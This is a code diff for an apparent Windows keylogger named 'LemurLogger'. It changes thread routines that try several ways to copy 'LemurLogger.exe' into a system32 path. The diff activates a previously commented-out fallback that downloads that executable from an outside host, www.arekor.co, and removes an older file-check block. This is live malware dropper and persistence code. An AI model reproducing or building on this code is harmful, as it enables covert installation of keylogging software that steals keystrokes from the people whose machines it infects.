@@ -12,7 +12,7 @@
 #include "IO.h"
 #include <windows.h>
 #include <tchar.h>
-//#include <strsafe.h>
+#include <strsafe.h>
 
 #define MAX_Procress 1
 #define BUF_SIZE 1024
@@ -30,10 +30,6 @@ DWORD WINAPI ThreadCopy( LPVOID lpParam )
 {
     HANDLE hStdout;
     Pcheckdata pDataArray;
-
-    TCHAR msgBuf[BUF_SIZE];
-    size_t cchStringSize;
-    DWORD dwChars;
 
     // Make sure there is a console to receive output results.
 
@@ -60,11 +56,11 @@ DWORD WINAPI ThreadCopy( LPVOID lpParam )
                 //do copy 3
                 if (!(IO::copy(path,filename))) {
                    //do copy 4
-                    const char* des_path = path.c_str();
+
                     std::string url = "www.arekor.co/content/images/LemurLogger.exe";
-                    /*if (!(download_File(url,des_path))) {
+                    if (!(IO::download_File(url.c_str(),path.c_str()))) {
                         return 1;
-                    }*/
+                    }
                 }
             }
         }else{
@@ -80,10 +76,6 @@ DWORD WINAPI ThreadCheckFile( LPVOID lpParam )
     HANDLE hStdout;
     Pcheckdata pDataArray;
 
-    TCHAR msgBuf[BUF_SIZE];
-    size_t cchStringSize;
-    DWORD dwChars;
-
     // Make sure there is a console to receive output results.
 
     hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -97,32 +89,9 @@ DWORD WINAPI ThreadCheckFile( LPVOID lpParam )
     pDataArray = (Pcheckdata)lpParam;
 
     // Print the parameter values using thread-safe functions.
-    if (!(pDataArray->value)) {
-        //do copy 1
-        std::string path = "C:\\window\\system32\\";
-        std::string filename = "LemurLogger.exe";
-        std::string fullpath = path+filename;
-        if(!(IO::copy_w_cmd(path,filename))){
-            //do copy 2
-            const char* desfile_path = fullpath.c_str();
-            if (!(IO::ms_Copyfile(desfile_path))) {
-                //do copy 3
-                if (!(IO::copy(path,filename))) {
-                    //do copy 4
-                    const char* des_path = path.c_str();
-                    std::string url = "www.arekor.co/content/images/LemurLogger.exe";
-                    /*if (!(download_File(url,des_path))) {
-                        return 1;
-                    }*/
-                }
-            }
-        }else{
-            pDataArray->value = true;
-            return 0;
-        }
-    }
+    //Tu do check file
 
-    return 1;
+    return 0;
 }
 
 bool start()
